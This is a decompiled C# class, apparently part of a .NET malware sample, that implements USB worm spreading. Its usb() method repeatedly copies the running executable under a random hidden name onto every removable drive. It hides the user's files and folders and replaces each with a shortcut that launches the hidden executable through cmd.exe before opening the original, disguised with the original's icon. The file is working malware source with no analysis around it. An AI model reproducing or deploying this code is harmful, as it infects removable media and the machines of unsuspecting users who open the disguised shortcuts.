using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns0;

namespace WindowsApplication1;

public class USB_link
{
	private bool bool_0;

	private Thread thread_0;

	public string ExeName;

	public USB_link()
	{
		bool_0 = false;
		thread_0 = null;
		ExeName = Conversions.ToString(Operators.ConcatenateObject(GenStr(), (object)".exe"));
	}

	public void Start()
	{
		bool flag = default(bool);
		try
		{
			if (flag = thread_0 == null)
			{
				thread_0 = new Thread(usb, 1);
				thread_0.Start();
			}
		}
		catch (Exception exception_)
		{
			Class11.smethod_23(exception_, this, flag);
			throw;
		}
	}

	public void clean()
	{
		checked
		{
			bool flag = default(bool);
			DriveInfo[] drives = default(DriveInfo[]);
			int num = default(int);
			bool flag2 = default(bool);
			DriveInfo driveInfo = default(DriveInfo);
			bool flag3 = default(bool);
			string[] files = default(string[]);
			int num2 = default(int);
			string text = default(string);
			Exception ex2 = default(Exception);
			string[] directories = default(string[]);
			int num3 = default(int);
			string text2 = default(string);
			DirectoryInfo directoryInfo = default(DirectoryInfo);
			Exception ex4 = default(Exception);
			Exception ex6 = default(Exception);
			try
			{
				bool_0 = true;
				while (flag = thread_0 != null)
				{
					Thread.Sleep(1);
				}
				drives = DriveInfo.GetDrives();
				num = 0;
				while (flag2 = num < drives.Length)
				{
					driveInfo = drives[num];
					try
					{
						if ((flag = driveInfo.IsReady) && (flag3 = (driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
						{
							if (flag2 = File.Exists(driveInfo.Name + ExeName))
							{
								File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Normal);
								File.Delete(driveInfo.Name + ExeName);
							}
							files = Directory.GetFiles(driveInfo.Name);
							num2 = 0;
							while (flag2 = num2 < files.Length)
							{
								text = files[num2];
								try
								{
									File.SetAttributes(text, FileAttributes.Normal);
									if (flag2 = text.ToLower().EndsWith(".lnk"))
									{
										File.Delete(text);
									}
								}
								catch (Exception ex)
								{
									ProjectData.SetProjectError(ex);
									ex2 = ex;
									ProjectData.ClearProjectError();
								}
								num2++;
							}
							directories = Directory.GetDirectories(driveInfo.Name);
							num3 = 0;
							while (flag2 = num3 < directories.Length)
							{
								text2 = directories[num3];
								try
								{
									directoryInfo = new DirectoryInfo(text2);
									directoryInfo.Attributes = FileAttributes.Normal;
									directoryInfo = null;
								}
								catch (Exception ex3)
								{
									ProjectData.SetProjectError(ex3);
									ex4 = ex3;
									ProjectData.ClearProjectError();
								}
								num3++;
							}
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						ex6 = ex5;
						ProjectData.ClearProjectError();
					}
					num++;
				}
			}
			catch (Exception exception_)
			{
				Class11.smethod_32(exception_, new object[17]
				{
					this, driveInfo, text, ex2, text2, ex4, ex6, num, drives, num2,
					files, num3, directories, directoryInfo, flag, flag3, flag2
				});
				throw;
			}
		}
	}

	public void usb()
	{
		checked
		{
			bool flag = default(bool);
			DriveInfo[] drives = default(DriveInfo[]);
			int num = default(int);
			DriveInfo driveInfo = default(DriveInfo);
			bool isReady = default(bool);
			bool flag2 = default(bool);
			string[] files = default(string[]);
			int num2 = default(int);
			string text = default(string);
			object[] array = default(object[]);
			object obj2 = default(object);
			object[] array2 = default(object[]);
			string[] array4 = default(string[]);
			string[] directories = default(string[]);
			int num3 = default(int);
			string text2 = default(string);
			object obj8 = default(object);
			Exception ex2 = default(Exception);
			Exception ex4 = default(Exception);
			try
			{
				bool_0 = false;
				while (flag = !bool_0)
				{
					drives = DriveInfo.GetDrives();
					num = 0;
					while (flag = num < drives.Length)
					{
						driveInfo = drives[num];
						try
						{
							if ((isReady = driveInfo.IsReady) && (flag2 = ((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
							{
								try
								{
									if (flag = File.Exists(driveInfo.Name + ExeName))
									{
										File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Normal);
									}
									File.Copy(Application.get_ExecutablePath(), driveInfo.Name + ExeName, overwrite: true);
									File.SetAttributes(driveInfo.Name + ExeName, FileAttributes.Hidden);
									files = Directory.GetFiles(driveInfo.Name);
									num2 = 0;
									while (flag = num2 < files.Length)
									{
										text = files[num2];
										if (flag = (Operators.CompareString(Path.GetExtension(text)!.ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + ExeName.ToLower(), false) != 0))
										{
											File.SetAttributes(text, FileAttributes.Hidden);
											File.Delete(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk");
											object obj = Interaction.CreateObject("WScript.Shell", "");
											array = new object[1] { driveInfo.Name + new FileInfo(text).get_Name() + ".lnk" };
											obj2 = NewLateBinding.LateGet(obj, (Type)null, "CreateShortcut", array, (string[])null, (Type[])null, (bool[])null);
											object obj3 = obj2;
											array2 = new object[1] { "cmd.exe" };
											NewLateBinding.LateSetComplex(obj3, (Type)null, "TargetPath", array2, (string[])null, (Type[])null, false, true);
											object obj4 = obj2;
											array2 = new object[1] { "" };
											NewLateBinding.LateSetComplex(obj4, (Type)null, "WorkingDirectory", array2, (string[])null, (Type[])null, false, true);
											object obj5 = obj2;
											array2 = new object[1];
											object[] array3 = array2;
											array4 = new string[5]
											{
												"/c start ",
												ExeName.Replace(" ", "\" \""),
												"&start ",
												new FileInfo(text).get_Name().Replace(" ", "\" \""),
												" & exit"
											};
											array3[0] = string.Concat(array4);
											NewLateBinding.LateSetComplex(obj5, (Type)null, "Arguments", array2, (string[])null, (Type[])null, false, true);
											object obj6 = obj2;
											array2 = new object[1] { GetIcon(Path.GetExtension(text)) };
											NewLateBinding.LateSetComplex(obj6, (Type)null, "IconLocation", array2, (string[])null, (Type[])null, false, true);
											NewLateBinding.LateCall(obj2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
											obj2 = null;
										}
										num2++;
									}
									directories = Directory.GetDirectories(driveInfo.Name);
									num3 = 0;
									while (flag = num3 < directories.Length)
									{
										text2 = directories[num3];
										File.SetAttributes(text2, FileAttributes.Hidden);
										File.Delete(driveInfo.Name + new DirectoryInfo(text2).get_Name() + " .lnk");
										object obj7 = Interaction.CreateObject("WScript.Shell", "");
										array2 = new object[1] { driveInfo.Name + Path.GetFileNameWithoutExtension(text2) + " .lnk" };
										obj8 = NewLateBinding.LateGet(obj7, (Type)null, "CreateShortcut", array2, (string[])null, (Type[])null, (bool[])null);
										object obj9 = obj8;
										array = new object[1] { "cmd.exe" };
										NewLateBinding.LateSetComplex(obj9, (Type)null, "TargetPath", array, (string[])null, (Type[])null, false, true);
										object obj10 = obj8;
										array2 = new object[1] { "" };
										NewLateBinding.LateSetComplex(obj10, (Type)null, "WorkingDirectory", array2, (string[])null, (Type[])null, false, true);
										object obj11 = obj8;
										array2 = new object[1];
										object[] array5 = array2;
										array4 = new string[5]
										{
											"/c start ",
											ExeName.Replace(" ", "\" \""),
											"&explorer /root,\"%CD%",
											new DirectoryInfo(text2).get_Name(),
											"\" & exit"
										};
										array5[0] = string.Concat(array4);
										NewLateBinding.LateSetComplex(obj11, (Type)null, "Arguments", array2, (string[])null, (Type[])null, false, true);
										object obj12 = obj8;
										array2 = new object[1] { "%SystemRoot%\\system32\\SHELL32.dll,3" };
										NewLateBinding.LateSetComplex(obj12, (Type)null, "IconLocation", array2, (string[])null, (Type[])null, false, true);
										NewLateBinding.LateCall(obj8, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
										obj8 = null;
										num3++;
									}
								}
								catch (Exception ex)
								{
									ProjectData.SetProjectError(ex);
									ex2 = ex;
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							ex4 = ex3;
							ProjectData.ClearProjectError();
						}
						num++;
					}
					Thread.Sleep(3000);
				}
				thread_0 = null;
			}
			catch (Exception exception_)
			{
				Class11.smethod_32(exception_, new object[20]
				{
					this, driveInfo, text, text2, ex2, ex4, num, drives, num2, files,
					array, obj2, array2, array4, num3, directories, obj8, isReady, flag2, flag
				});
				throw;
			}
		}
	}

	public object GenStr()
	{
		long num = default(long);
		Random random = default(Random);
		string text = default(string);
		string text2 = default(string);
		long num2 = default(long);
		long num3 = default(long);
		long num5 = default(long);
		object obj = default(object);
		try
		{
			num = 20L;
			random = new Random();
			text = "abcdrERJjg76heg9w0h";
			text2 = null;
			num2 = 20L;
			num3 = 0L;
			while (true)
			{
				long num4 = num3;
				num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text2 += Conversions.ToString(text[random.Next(text.Length)]);
				num3 = checked(num3 + 1L);
			}
			obj = text2;
			return obj;
		}
		catch (Exception exception_)
		{
			Class11.smethod_30(exception_, this, text, obj, num, text2, random, num3, num2, num5);
			throw;
		}
	}

	public string GetIcon(string ext)
	{
		RegistryKey registryKey = default(RegistryKey);
		string text = default(string);
		bool flag = default(bool);
		string text2 = default(string);
		Exception object_ = default(Exception);
		try
		{
			try
			{
				registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", writable: false);
				text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(ext, writable: false)!.GetValue(""), (object)"\\DefaultIcon\\")))!.GetValue("", ""));
				if (flag = !text.Contains(","))
				{
					text += ",0";
				}
				text2 = text;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				object_ = ex;
				text2 = "";
				ProjectData.ClearProjectError();
			}
			return text2;
		}
		catch (Exception exception_)
		{
			Class11.smethod_28(exception_, this, ext, text2, text, registryKey, object_, flag);
			throw;
		}
	}
}
